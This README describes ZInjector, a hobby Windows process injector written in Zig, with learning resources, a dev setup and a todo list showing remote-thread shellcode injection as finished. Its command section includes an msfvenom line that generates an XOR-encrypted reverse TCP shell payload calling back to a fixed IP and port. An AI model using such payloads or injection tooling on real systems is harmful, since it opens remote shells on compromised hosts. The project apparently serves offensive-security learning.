# ZInjector

Simple Process injector for Windows (for now) written in Zig.

## DISCLAIMER

This is my first project in Zig so the code is pretty mmmm rude(?). The goal is to learn Zig and perform process injection.
I haven't decided what to implement yet, but the first steps are to learn Zig and implement simple process injection.

## Some cool resource for learning Zig and Process Injection

- [Zig Guide](https://zig.guide/)
- [Zig Standard Library](https://ziglang.org/documentation/master/std/)
- [LearnXInYMinutes](https://learnxinyminutes.com/zig/)
- [Process Injection Techniques](https://www.ired.team/offensive-security/code-injection-process-injection)
- [MITRE](https://attack.mitre.org/techniques/T1055/)
- [DLL Injector C++](https://github.com/leetCipher/Malware.development/tree/main/dll-injector)
- [Cool cheasheet (zig_in_depth)](https://codeberg.org/dude_the_builder/zig_in_depth)
- https://github.com/marlersoft/zigwin32/tree/main
- https://raw.githubusercontent.com/marlersoft/zigwin32/refs/heads/main/win32/everything.zig
- https://black-hat-zig.cx330.tw/
- https://privdayz.com/tools/shellcode-gen

## Dev

- Zig Version: 0.15.2
- OS: Arch Linux
- IDE: Zed
- LSP: Zls

Deps for cross-compiler on linux:  mingw-w64-headers,mingw-w64-gcc

## Todo:

- [x] PoC
- [x] Resolution of relative path to absolute path
- [x] Search process by name
- [x] Implement arguments parsing
- [x] Thread Remote creation with shellcode injection
- [ ] SetWindowHookEx Code Injection
- [ ] ...

## Command:

- Compile: `zig build -Dtarget=x86_64-windows -Doptimize=ReleaseSmall --summary all`
- Test: `zig build test --summary all`
- Shellcode generator: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.118 LPORT=8080 -f zig --encrypt xor --encrypt-key a`
